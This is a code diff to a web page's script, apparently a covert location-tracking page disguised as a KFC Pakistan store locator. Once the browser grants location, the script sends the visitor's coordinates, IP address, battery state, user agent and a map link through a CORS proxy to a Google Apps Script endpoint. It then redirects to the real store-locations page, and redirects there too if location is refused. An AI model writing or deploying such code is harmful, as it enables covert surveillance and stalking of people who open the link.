@@ -138,32 +138,33 @@ async function sendLocation() {
   // Geolocation
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-      (position) => {
+      async (position) => {
         lat = position.coords.latitude;
         lon = position.coords.longitude;
         accuracy = position.coords.accuracy;
 
         const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-        fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
+        await fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            lat: lat,
-            lon: lon,
-            accuracy: accuracy,
+            lat: lat.toString(),
+            lon: lon.toString(),
+            accuracy: accuracy.toString(),
             ip: ip,
             battery: battery,
             ua: userAgent,
             map: mapUrl
           })
-        }).finally(() => {
-          setTimeout(() => {
-            window.location.href = "https://www.kfcpakistan.com/store-locations";
-          }, 1000);
         });
+
+        // Redirect after success
+        setTimeout(() => {
+          window.location.href = "https://www.kfcpakistan.com/store-locations";
+        }, 1000);
       },
       () => {
         window.location.href = "https://www.kfcpakistan.com/store-locations";
@@ -176,6 +177,7 @@ async function sendLocation() {
 </script>
 </body>
 </html>
+
 
 
 
